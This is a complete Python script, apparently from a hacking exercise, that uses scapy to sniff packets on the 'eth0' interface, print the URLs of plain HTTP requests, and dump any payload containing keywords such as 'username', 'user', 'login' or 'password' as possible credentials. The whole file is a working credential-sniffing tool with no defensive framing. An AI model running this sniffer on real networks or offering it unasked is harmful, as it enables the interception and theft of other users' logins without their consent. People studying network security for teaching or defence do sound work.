import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    """
       Captures packets on the specified network interface.

       :param interface: Network interface to sniff on (e.g., 'eth0').
    """
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    """
       Extracts the URL from an HTTP request packet.

       :param packet: The sniffed packet containing an HTTP request.
       :return: Full URL string of the request.
    """
    return packet[http.HTTPRequest].Host.decode('utf-8') + packet[http.HTTPRequest].Path.decode('utf-8')


def get_login_info(packet):
    """
        Extracts possible login credentials from a packet payload.

        :param packet: The sniffed packet potentially containing login credentials.
        :return: The extracted login information if found, otherwise None.
    """
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode('utf-8')
        keywords = ['username', 'uname', 'user', 'login', 'password', 'pass']
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    """
    Processes sniffed packets to extract and print HTTP requests and potential credentials.

    :param packet: The sniffed packet.
    """
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f'[+] HTTP Request >> {url}')
        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n[+] Possible Username/Password > {login_info}\n\n')


def main():
    """Starts sniffing on given interface"""
    sniff('eth0')


if __name__ == '__main__':
    main()
